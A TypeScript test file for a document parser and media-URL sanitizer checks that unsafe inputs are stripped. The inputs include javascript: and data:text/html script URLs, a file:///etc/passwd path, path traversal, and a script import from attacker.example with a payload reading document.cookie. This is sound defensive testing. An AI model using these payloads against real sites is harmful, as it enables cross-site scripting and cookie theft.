import assert from "node:assert/strict";
import test from "node:test";
import { parseMotionDoc } from "@/core/motion-doc/domain/motionDocParser";
import { sanitizeMotionDocMediaSource } from "@/core/motion-doc/domain/mediaSource";

test("MotionDoc accepts only safe media URL protocols", () => {
  assert.equal(sanitizeMotionDocMediaSource("https://cdn.example.com/image.webp"), "https://cdn.example.com/image.webp");
  assert.equal(sanitizeMotionDocMediaSource("blob:https://app.example.com/asset-id"), "blob:https://app.example.com/asset-id");
  assert.equal(sanitizeMotionDocMediaSource("user/presentation/image.webp"), "user/presentation/image.webp");
  assert.equal(sanitizeMotionDocMediaSource("javascript:alert(1)"), "");
  assert.equal(sanitizeMotionDocMediaSource("data:text/html,<script>alert(1)</script>"), "");
  assert.equal(sanitizeMotionDocMediaSource("file:///etc/passwd"), "");
  assert.equal(sanitizeMotionDocMediaSource("../../private/image.webp"), "");
});

test("MotionDoc parser does not execute imports, expressions, or arbitrary JSX", () => {
  const document = parseMotionDoc(`# Security

import Evil from "https://attacker.example/evil.js"

<Slide backgroundImage="javascript:alert(1)">
  <Evil payload={globalThis.document.cookie} />
  <iframe src="https://attacker.example"></iframe>
  <ImageBlock src="data:text/html,<script>alert(1)</script>" alt="Unsafe" />
  <Text>{globalThis.document.cookie}</Text>
</Slide>`);

  assert.equal(document.scenes[0].props.backgroundImage, "");
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "ImageBlock" && block.props.src === ""), true);
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "Text" && block.text.includes("<iframe")), true);
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "Text" && block.text.includes("document.cookie")), true);
});
